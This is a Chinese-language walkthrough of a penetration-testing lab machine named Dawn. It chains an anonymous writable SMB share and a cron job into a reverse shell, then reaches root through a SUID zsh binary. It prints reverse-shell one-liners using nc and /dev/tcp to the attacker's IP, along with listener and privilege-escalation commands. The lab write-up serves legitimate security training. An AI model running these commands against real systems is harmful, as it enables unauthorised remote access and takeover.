<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mmWSt1P6S-tPA9B4icdKyg)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本文由掌控安全学院 - 杳若投

总结
--

getwebshell → `SMB`共享无密码 → `SMB`存在上传功能 → 存在周期执行任务 → `SMB`上传反弹`shell` → 被执行获得`webshell`

提 权 思 路 → `suid`发现`zsh` → `-p`容器提权

准备工作
----

*   启动 VPN  
    获取攻击机 IP > `192.168.45.163`
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oow8dibXFGWY5wyKYTaQXfSO2VOY7d6Pphq03NFiaXAoiauxEXaoDrfibjg/640?wx_fmt=png)

*   启动靶机  
    获取目标机器 IP > `192.168.242.11`
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oiamTdL0p7uXpaSTxZEO7y7gx51NRrXY6Nc6JGeefgTicm0iauR75Nzw8g/640?wx_fmt=png)

信息收集 - 端口扫描
-----------

### 目标开放端口收集

*   Nmap 开放端口扫描 2 次
    
    ```
    sudo nmap --min-rate 10000 -p- 192.168.242.11
    
    ```
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2o261v1ljwEcicu0gewL3pNAfWV5rT0hYIshw4PewpRlzjklYBnicJn9tg/640?wx_fmt=png)

通过两次收集到的端口:`→80,139,445,3306`

### 目标端口对应服务探测

```
# tcp探测
sudo nmap -sT -sV -O -sC -p80,139,445,3306 192.168.242.11

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2okECHhHOrsvq3BagC5rgZdgA2MJPWaGhGYPAUicsE4DlZoLWXAtopzlg/640?wx_fmt=png)

信息收集 - 端口测试
-----------

```
80/tcp open http Apache httpd 2.4.38 ((Debian))
445/tcp open netbios- Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open mysql MySQL 5.5.5-10.3.15-MariaDB-1

```

首先思考 445 端口是否存在 SMB 共享内容，在思考 3306 端口是否存在弱口令，最后来挖掘 80 端口

### 445-SMB 端口的信息收集

#### 445-SMB 是否无需密码探测 (存在)

连接成功则 SMB 没有开启密码

```
# 利用-L查看SMB的内容
smbclient -L //192.168.242.11

```

发现`SMB`服务不需要密码即可访问，查看到了目录`ITDEPT`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oGQZR7bPibO4CpWKyoHicR5VMKtUEXdMMkPIaib5KBBEMRWHyy8F9MYiaZw/640?wx_fmt=png)

#### 445-SMB 文件信息收集

```
# 利用获取到的[sambashare]直接进行访问查看内容
smbclient //192.168.242.11/ITDEPT -U root

```

查看了一下文件，没发现什么有用的内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oC7rgwcdeLGPMhC1rbccDBmic8uO5zmibLCsQmjZnsNK0Qib6oZVTCHTkQ/640?wx_fmt=png)

#### 445-SMB 的上传 (可能有用)

```
# 利用获取到的sambashare直接进行访问之后尝试使用PUT是否成功
smbclient //192.168.242.11/ITDEPT -U root
smb :\ > put [上传的文件]

```

尝试了上传功能，发现`SMB`的上传功能开启

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oUEmKupW3gZrGdjosfSXOia4z2rKUibicy1ibCCP4EBRD1oI3XHObuEp7icw/640?wx_fmt=png)

#### 445-SMB 用户名获取

```
# 抓取用户名
enum4linux 192.168.242.11

```

抓着玩，先去干其他的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oR1GfyWpMDFRhWqtHYIfBt1euE3GFkEtm0PZ1k7A8olmu5Wbpkfafqg/640?wx_fmt=png)

### 3306-Mysql 端口的信息收集

#### 3306-Mysql 端口的默认脆弱口令测试 (失败)

```
# 尝试直接使用mysql协议进行root:root尝试(远程需-h)
┌──(root㉿Kali)-[/home/bachang/Dawn]
└─# mysql -h 192.168.242.11 -uroot -proot
ERROR 1045 (28000): Access denied for user 'root'@'192.168.45.163' (using password: YES)

```

### 80-HTTP 端口的信息收集

访问 http://192.168.242.11/ 发现显示的是设备正在建设中，从源码步骤开始

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2o1IsjolZXtuQ627v4wQVuvqHK9V107IRd1E29jK52AQTSUgHe2cR5dQ/640?wx_fmt=png)

#### 信息收集 - 源码查看

```
# 包括文章中是否写明一些敏感信息
curl http://192.168.242.11
# 利用html2text转换纯文本方便查看
curl http://192.168.242.11 | html2text

```

没什么有用的信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oG9HyVpAiavjJ9tU8lxHiaGu6QVCZ02mNgFo8THQLTt28TQKa8dvVLJog/640?wx_fmt=png)

#### 信息收集 - 目录扫描

##### 信息收集 - 目录扫描初步

如果扫描发现 301 适当考虑 -r 2 进行递归

```
dirsearch -u http://192.168.242.11 -x 302,403
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2o829DuDB5DoztCqJXyVpj2nicMW48qfaJmghIMyveFvgZzQYjpm8sqJA/640?wx_fmt=png)

因为扫出了目录，深层次的扫描待选

```
信息收集-目录扫描(后缀)
信息收集-目录扫描(深度/大字典)
信息收集-目录扫描(深度/大字典后缀)

```

#### 信息收集 - 端点查看

`/log`端点查看  
发现该端点存在路径遍历

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2opvRcGWZ9VWPEicDDpNCGb7nIB8l8iaicCzbjRNf5IuKibVMIyxjPU5xTvw/640?wx_fmt=png)  
访问了其中的内容，发现只有`management.log`可以查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oXEEjfZibtzpnuJykRMdGC4NSG2GZicdyb5XpdgRXMAry64GrFkHem8Ig/640?wx_fmt=png)  
下载之后进行查看，发现为系统内运行日志

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oxiaulTdAA8qV5YHGfbMIr1snVyzRfoWk1AT9ZlUyC3gt6nHLRh1VbOg/640?wx_fmt=png)

##### 文件的信息收集

收集到了账户信息 `ganimedes`  
在查看的过程中发现每分钟会执行重复的命令，在充满的命令中发现一些有趣的内容  
确认了会周期性的执行给`777`的权限到对应的文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oWjfMm1GlVjFIV1RmbMX0RzUe045jTibichdJrBibuanfxZLEuV9JQUYiaw/640?wx_fmt=png)  
并且会执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2otUzHfZiaNJ6oEDgO4LTs6koKlribApBU9T6qY7A2xvNzo41pd37iatIqw/640?wx_fmt=png)

漏洞利用 - getwebshell
------------------

#### SMB + 计划执行突破

回到之前我们发现的 SMB 的文件夹发现是`ITDEPT`  
和我们发现周期性日志中给`777`权的文件夹相同  
推测可以将文件上传到`SMB`，等待执行获取反弹`shell`

##### 构造反弹 shell 的 payload

确定我们需要上传的文件名为`web-control`，构造内容

```
echo 'nc -e /bin/bash 192.168.45.163 4444' > web-control
echo 'bash -i >& /dev/tcp/192.168.45.163/4444 0>&1' > product-control

```

将文件上传到 SMB 中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oUoVB3V6g3K8gTFbQwkkjicpeB3ZeWVFEXgg9lgliad0H7dPQnYJrtfIw/640?wx_fmt=png)

攻击机开启监听

```
sudo nc -lvvp 4444
```

等待反弹 shell 的监听

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oC2cKyYpy5Lwyn552USqruRL0tXLxemOMXqfuMP38e9FzcL0vdrWC8g/640?wx_fmt=png)

成功反弹`shell`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oaqtlM0f8MANGBN4OADjKxQ1KtzTEXlu9v5PsbiaoUzAeM561Fv0vz7Q/640?wx_fmt=png)

内网遨游 - getshell
---------------

### 交互 shell

#### 交互 shell-python

由于获取的 shell 交互不友好，利用 python 获得新的交互 shell

```
# 利用python获取交互shell -> python失败使用python3
python -c "import pty;pty.spawn('/bin/bash')";

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oC8GA8KiaW2UKNnXiaUyQ8fdgmoIl2RnYX47JmQJahULY3xnlWX9FolCw/640?wx_fmt=png)

### FLAG1 获取

```
www-data@dawn:~$ find / -name local.txt 2>/dev/null
/home/dawn/local.txt
cat /home/dawn/local.txt
*************************

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2o2wMOONrL9SbDdwcdZmrLp9rsZoiavwUc8ePlg7icROdjlgApdNjszRdg/640?wx_fmt=png)

### 信息收集 - 内网基础信息收集

在获取 shell 之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测操作系统的发行版本

```
# 确定发行版本
lsb_release -a

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2ohjx6ESSz8DiaQAAbbrT8J1xx2duNk4VpQOK7cUIibSo7vHRxPN2x5y4g/640?wx_fmt=png)

#### 查看内核版本信息

```
# 确定内核版本
uname -a

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oNesO9sQn3nXDKwbiahNxsu2VWnFiaduxFwibfrtJSP3gHfJ8vWLEiaGwtw/640?wx_fmt=png)

#### 确认 home 目录下用户

```
# 发现了两个用户 和我们收集的一样
ls -al /home

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2osWQeem59gvldTlzct9KaWnrYTQRwubc4QF8PibfakHryiccLTmicWcHfw/640?wx_fmt=png)

##### 确认每个 home 目录下是否有隐藏文件 (待定)

```
# 例如.ssh找密码  ./*_history找历史记录等
ls -al /home/dawn

```

发现了隐藏的内容，先放一边，没思路就来

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oegGG3AJsjpBfCQq2giaVopTqt3rdSUVHoWhD0X6D438anDmiaiaiaZ7jQg/640?wx_fmt=png)

### 权限提升

#### Linux 提权 - sudo 提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

```
# 利用sudo -l寻找
sudo -l

```

发现`sudo`的是`sudo`，不太能提权

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oibGianibprTu3mg9XQicNG89moGx7HLOQicTt9bd2f6CD9U3XDXUTmppibOA/640?wx_fmt=png)

### Linux 提权 - suid 提权尝试

```
# -perm 文件权限
find / -perm -u=s -type f 2>/dev/null

```

发现了`zsh`进行搜索

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2ohFxxiaW3nUnZ699vkvSSOx0jPAbN3N1JAKiaZeiclTJmfvSjhSByOaLJA/640?wx_fmt=png)

如果发现有东西的话 访问 https://gtfobins.github.io 寻找

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2ofOm2JpibExyZO9KYm7Zq1eoxicP7wBamTxftZsgVNb1gh6GTAVKdN9pA/640?wx_fmt=png)  
`zsh`的提权其实与`bash`的类似

```
# 以下命令将以root身份打开一个zsh shell
zsh -p

```

提权成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2o8o9PQNhQEMIhwM0ZbEEZtibXXICs153EBzVA8g7at7IbuF3m3xx4ypw/640?wx_fmt=png)

### FLAG2 获取

```
cat /root/proof.txt
************************

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqegic9kuxEDrYWWuvkpbV2oSwUCrYpGhHUZsPbPkicmJZVSea5Er4DxUibNUiawmfwgrEcvmex2ZGQ4w/640?wx_fmt=png)  
完结撒花~

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力